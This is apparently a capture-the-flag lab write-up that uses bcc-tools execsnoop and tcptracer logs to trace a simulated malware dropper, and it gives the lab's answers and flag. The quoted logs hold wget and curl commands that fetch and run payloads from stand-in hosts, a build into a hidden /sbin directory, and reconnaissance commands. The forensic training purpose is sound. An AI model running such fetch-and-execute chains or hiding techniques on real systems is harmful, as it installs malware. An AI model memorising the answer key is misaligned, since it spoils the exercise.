#### 8. BCC Tools: Combo I

----

A newly appointed sysadmin was assigned a job to monitor the system activity. He ended up using a couple of scripts available from bcc-tools, and had recorded output from them. So there is different info available from different logs. Could you help him answer the following questions:

```sh
root@attackdefense:~# ls -l
total 12
-rw-rw-r-- 1 root root 3257 Jun 27 10:26 execsnoop.logs
-rw-rw-r-- 1 root root 6368 Jun 27 10:27 tcptracer.logs
root@attackdefense:~# 
```

- A malicious process had downloaded a payload script into /tmp directory using wget. What is the name of the malicious process?

```sh
root@attackdefense:~# grep wget execsnoop.logs
 80173  80171 /bin/sh -c wget -O /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe http://abc.pqr.xyz.local/payload.sh
 80174  80173 wget -O /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe http://abc.pqr.xyz.local/payload.sh
root@attackdefense:~#
```

```sh
root@attackdefense:~# grep 80171 execsnoop.logs
 80171  80164 ./random-sample
 80172  80171 /bin/sh -c mkdir /tmp/.b1b1d2597a4ff853e0de332dced213b3/
 80173  80171 /bin/sh -c wget -O /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe http://abc.pqr.xyz.local/payload.sh
 80223  80171 /bin/sh -c chmod +x /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe
 80225  80171 /bin/sh -c /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe
root@attackdefense:~#
```

```
random-sample
```

- What is the absolute path of the directory where the malicious process had downloaded the payload script?

```sh
# grep wget execsnoop.logs
# grep 80171 execsnoop.logs
/tmp/.b1b1d2597a4ff853e0de332dced213b3
```

- What is the IP address of the remote machine from which the payload script had been downloaded using wget?

```sh
root@attackdefense:~# grep wget tcptracer.logs
C  80174  wget             4  192.168.161.139  192.168.36.3     40864  80
X  80174  wget             4  192.168.161.139  192.168.36.3     40864  80
root@attackdefense:~#
```

```
192.168.36.3
```

- The malicious process passed the execution control to the payload script and terminated itself. The script had retrieved a gzip compressed archive from a remote machine and built a binary from the downloaded source. What is the domain name of the remote machine from which the archive was retrieved?

```sh
root@attackdefense:~# less execsnoop.logs
Tracing exec()s. Ctrl-C to end.
Instrumenting sys_execve
   PID   PPID ARGS
 79930  79926 mawk -W interactive -v o=1 -v opt_name=0 -v name= [...]
 79931  79929 cat -v trace_pipe
 79932   7592 bash
 79934  79933 lesspipe
 79935  79934 basename /usr/bin/lesspipe
 79937  79936 dirname /usr/bin/lesspipe
 79939  79938 dircolors -b
 79941  79940 ls /etc/bash_completion.d
 79950   7592 bash
 79952  79951 lesspipe
 79953  79952 basename /usr/bin/lesspipe
 79955  79954 dirname /usr/bin/lesspipe
 79957  79956 dircolors -b
 79959  79958 ls /etc/bash_completion.d
 79968   7592 bash
 79970  79969 lesspipe
 79971  79970 basename /usr/bin/lesspipe
 79973  79972 dirname /usr/bin/lesspipe
 79975  79974 dircolors -b
 79977  79976 ls /etc/bash_completion.d
 79987  79986 /usr/lib/firefox/firefox -contentproc -childID 37 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 79992  79991 /usr/lib/firefox/firefox -contentproc -childID 38 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 80030  80029 /usr/lib/firefox/firefox -contentproc -childID 39 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 80057  80055 /usr/lib/firefox/firefox -contentproc -childID 40 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 80075  80071 /usr/lib/firefox/firefox -contentproc -childID 41 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 80105  80104 /usr/lib/firefox/firefox -contentproc -childID 42 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 80128  80127 /usr/lib/firefox/firefox -contentproc -childID 43 -isForBrowser -prefsLen 8989 -prefMapSize 179756 [...]
 80164  75778 sudo ./random-sample
 80171  80164 ./random-sample
 80172  80171 /bin/sh -c mkdir /tmp/.b1b1d2597a4ff853e0de332dced213b3/
 80173  80171 /bin/sh -c wget -O /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe http://abc.pqr.xyz.local/payload.sh
 80175  80172 mkdir /tmp/.b1b1d2597a4ff853e0de332dced213b3/
 80174  80173 wget -O /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe http://abc.pqr.xyz.local/payload.sh
 80195  80194 x-terminal-emulator
 80199  80195 /usr/bin/gnome-terminal.real
 80203   7592 bash
 80205  80204 lesspipe
 80206  80205 basename /usr/bin/lesspipe
 80208  80207 dirname /usr/bin/lesspipe
 80210  80209 dircolors -b
 80212  80211 ls /etc/bash_completion.d
 80221  80203 ifconfig
 80222  80203 ps aux
 80223  80171 /bin/sh -c chmod +x /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe
 80224  80223 chmod +x /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe
 80225  80171 /bin/sh -c /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe
 80226  80225 /tmp/.b1b1d2597a4ff853e0de332dced213b3/.exe
 80227  80226 ls -al
 80228  80226 ps aux
 80229  80226 whoami
 80230  80226 uname -a
 80231  80226 mkdir /tmp/.8fb2de9a69d21e8b5e355cea023ff371/
 80232  80226 curl http://xyz.fake-domain.onion:8000/packages.tar.gz > /tmp/.8fb2de9a69d21e8b5e355cea023ff371/packages.tar.gz
 80233  80226 tar xzvf /tmp/.8fb2de9a69d21e8b5e355cea023ff371/packages.tar.gz
 80234  80233 gzip -d
 80235  80226 make
 80236  80226 make install
 80237  80226 make clean
 80238  80226 mv bin/simple-binary /sbin/.3d9d001b2e1cffeb6b2d85098ef56363/.simple-binary
 80239  80226 rm -rf /tmp/.8fb2de9a69d21e8b5e355cea023ff371
:
```

```
xyz.fake-domain.onion
```

- The binary built from source is stored in /sbin directory. Provide the full path of the binary.

```sh
# root@attackdefense:~# less execsnoop.logs
/sbin/.3d9d001b2e1cffeb6b2d85098ef56363/.simple-binary
```

- Retrieve the flag stored in the binary.

```sh
root@attackdefense:~# file /sbin/.3d9d001b2e1cffeb6b2d85098ef56363/.simple-binary
/sbin/.3d9d001b2e1cffeb6b2d85098ef56363/.simple-binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=78f1a9545ab7408ff8a664cd5bb9917522f57450, not stripped
root@attackdefense:~#
```

```sh
root@attackdefense:~# strings /sbin/.3d9d001b2e1cffeb6b2d85098ef56363/.simple-binary | grep -i flag
FLAG = ce859f7b2d82cc7c06eb75b95707708f
root@attackdefense:~#
```

```sh
root@attackdefense:~# /sbin/.3d9d001b2e1cffeb6b2d85098ef56363/.simple-binary
FLAG = ce859f7b2d82cc7c06eb75b95707708f
Exploit code:
Contacting Command-and-Control server...
Extracting system info...
root@attackdefense:~#
```

```
ce859f7b2d82cc7c06eb75b95707708f
```

----

###### References:

- [Execsnoop script](https://github.com/iovisor/bcc/blob/master/tools/execsnoop.py)
- [Execsnoop Examples](https://github.com/iovisor/bcc/blob/master/tools/execsnoop_example.txt)
- [Tcptracer script](https://github.com/iovisor/bcc/blob/master/tools/tcptracer.py)
- [Tcptracer Examples](https://github.com/iovisor/bcc/blob/master/tools/tcptracer_example.txt)
- [BCC Tools](https://github.com/iovisor/bcc)

----

EOF
